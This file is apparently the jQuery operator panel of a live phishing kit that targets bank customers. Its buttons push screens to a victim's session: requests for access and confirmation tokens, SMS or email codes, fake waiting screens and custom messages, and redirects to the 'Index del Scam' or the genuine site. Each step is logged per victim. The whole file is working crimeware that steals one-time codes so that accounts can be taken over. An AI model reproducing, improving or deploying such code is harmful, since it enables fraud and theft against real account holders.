$(document).ready(function(){

	var idClienteDataPanel = $('#sessionIDCliente').val();

	function getTime(){
        var d = new Date();
        var h = d.getHours();
        var m = d.getMinutes();
        var s = d.getSeconds();
        var tz = "";
        var fecha = "";
    
        if(h<10){h = "0"+h;tz = "AM";}else{tz = "PM";}
        if(m<10){m = "0"+m;}
        if(s<10){s = "0"+s;}
        fecha = h+":"+m+":"+s+" "+tz;
        
        return fecha;
    }

    $('.btnReload').click(function(){
    	window.location.reload();
    });


    

    /*
	$('#tela_TFV').change(function(){
		if($(this).val() != ""){
			$('#txtTFVC').attr('disabled',false).focus();
		}else{
			$('#txtTFVC').attr('disabled',true);
		}
	});


	$('#tela_TFN').change(function(){
		if($(this).val() != ""){
			$('#txtTFV').attr('disabled',false).focus();
		}else{
			$('#txtTFV').attr('disabled',true);
		}
	});

	$('#tela_TM').change(function(){
		if($(this).val() != ""){
			$('#txtTM').attr('disabled',false).focus();
		}else{
			$('#txtTM').attr('disabled',true);
		}
	});
*/

/*
	$('#tela_MENSAJES').change(function(){
		if($(this).val() != ""){
			$('#msgPersonalizado').attr('disabled',false).focus();
		}else{
			$('#msgPersonalizado').attr('disabled',true);
		}
	});
*/
	



	/*

	$('#btnTFV').click(function(e){
		e.preventDefault();
		var tipoAlta = $('#tela_TFV');
		var code = $('#txtTFVC');
		var hora = getTime();
		var altaHistory = "Token de Confirmacion";

		if($('#tela_TFV').val() == ""){
			alert('Debe seleccionar una Tela');
			$('#tela_TFV').focus();
		}else{
			if(code.val() == ""){
				alert('Ingresa un mensaje');
				code.focus();
			}else{
				//var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
				var history = " - "+altaHistory+" - Drop: "+code.val();
	            Panel.update(6, code.val(), '', 'token_confirmacion', idClienteDataPanel);
	            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
			}
		}
	});



	$('#btnTFV2').click(function(e){
		e.preventDefault();
		var tipoAlta = $('#tela_TFN');
		var code = $('#txtTFV');
		var hora = getTime();
		var altaHistory = "";
		var request = "";

		if(tipoAlta.val() == "TFN_TA"){
			altaHistory = "Token de acceso";
			request = "token_acceso";
		}else if(tipoAlta.val() == "TFN_TC"){
			altaHistory = "Token de confirmacion";
			request = "token_confirmacion";
		}else{
			altaHistory = "Token de alta y modificacion";
			request = "token_alta_modificacion";
		}


		if($('#tela_TFN').val() == ""){
			alert('Debe seleccionar una Tela');
			$('#tela_TFN').focus();
		}else{
			if(code.val() == ""){
				alert('Ingresa un mensaje');
				code.focus();
			}else{
				//alert(request);
				//var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
				var history = " - "+altaHistory+" - Drop: "+code.val();
	            Panel.update(6, code.val(), '', request, idClienteDataPanel);
	            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
			}
		}
	});






	$('#btnTM').click(function(e){
		e.preventDefault();
		var tipoAlta = $('#tela_TM');
		var code = $('#txtTM');
		var hora = getTime();
		var altaHistory = "";
		var request = "";

		if(tipoAlta.val() == "TM_TA"){
			altaHistory = "Token de acceso";
			request = "token_acceso";
		}else if(tipoAlta.val() == "TM_TC"){
			altaHistory = "Token de confirmacion";
			request = "token_confirmacion";
		}else{
			altaHistory = "Token de alta y modificacion";
			request = "token_alta_modificacion";
		}

		if($('#tela_TM').val() == ""){
			alert('Debe seleccionar una Tela');
			$('#tela_TM').focus();
		}else{
			if(code.val() == ""){
				alert('Ingresa un mensaje');
				code.focus();
			}else{
				//alert(request);
				//var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
				var history = " - "+altaHistory+" - Drop: "+code.val();
	            Panel.update(6, code.val(), '', request, idClienteDataPanel);
	            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
			}
		}
	});*/





	$('#btnMensajes').click(function(e){
		e.preventDefault();
		var tipoMensaje = $('#tela_MENSAJES');
		var mensaje = $('#msgPersonalizado');
		var hora = getTime();
		var altaHistory = "";
		var request = "";

		if(tipoMensaje.val() == "MP_CI"){
			altaHistory = "Con Input";
			request = "mgs_con_input";
		}else if(tipoMensaje.val() == "MP_SI"){
			altaHistory = "Sin Input";
			request = "mgs_sin_input";
		}else if(tipoMensaje.val() == "MP_SIS"){
			altaHistory = "Salir a Index del Scam";
			request = "mgs_index_scam";
		}else if(tipoMensaje.val() == "MP_F"){
			altaHistory = "Ir al Folio";
			request = "mgs_folio";
		}else{
			altaHistory = "Salir a Pagina Original";
			request = "mgs_index_original";
		}

		if($('#tela_MENSAJES').val() == ""){
			alert('Debe seleccionar una Tela');
			$('#tela_MENSAJES').focus();
		}else{

			if(mensaje.val() == ""){
				alert('Ingresa un mensaje');
				mensaje.focus();
			}else{
				var history = " - "+altaHistory+" - Mensaje: "+mensaje.val();
	            Panel.update(6, '', mensaje.val(), request, idClienteDataPanel);
	            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
	            mensaje.val("");
			}
			/*if($('#tela_MENSAJES').val() == "MP_CI" && mensaje.val() == ""){
				alert('Ingresa un mensaje');
				mensaje.focus();
			}else{
				//alert(request);
				var history = " - "+altaHistory+" - Mensaje: "+mensaje.val();
	            Panel.update(6, '', mensaje.val(), request, idClienteDataPanel);
	            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
	            mensaje.val("");
			}*/

		}
	});


	$('#btnOtrasTelas').click(function(e){
		e.preventDefault();
		var tipoAlta = $('#tela_OtrasTelas');
		var code = $('#txtTM');
		var hora = getTime();
		var altaHistory = "";
		var request = "";

		if(tipoAlta.val() == "OT_1_E"){
			altaHistory = "1 Minuto de Espera";
			request = "loading_1";
		}else if(tipoAlta.val() == "OT_2_E"){
			altaHistory = "2 Minuto de Espera";
			request = "loading_2";
		}else if(tipoAlta.val() == "OT_3_E"){
			altaHistory = "3 Minuto de Espera";
			request = "loading_3";
		}else if(tipoAlta.val() == "OT_C_SMS"){
			altaHistory = "Pedir Mensaje SMS";
			request = "pedir_msg_sms";
		}else{
			altaHistory = "Pedir Mensaje EMAIL";
			request = "pedir_msg_email";
		}

		if($('#tela_OtrasTelas').val() == ""){
			alert('Debe seleccionar una Tela');
			$('#tela_OtrasTelas').focus();
		}else{
			//alert(request);
			var history = " - Pediste  "+altaHistory;
            Panel.update(6, '', '', request, idClienteDataPanel);
            Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
		}
	});








});
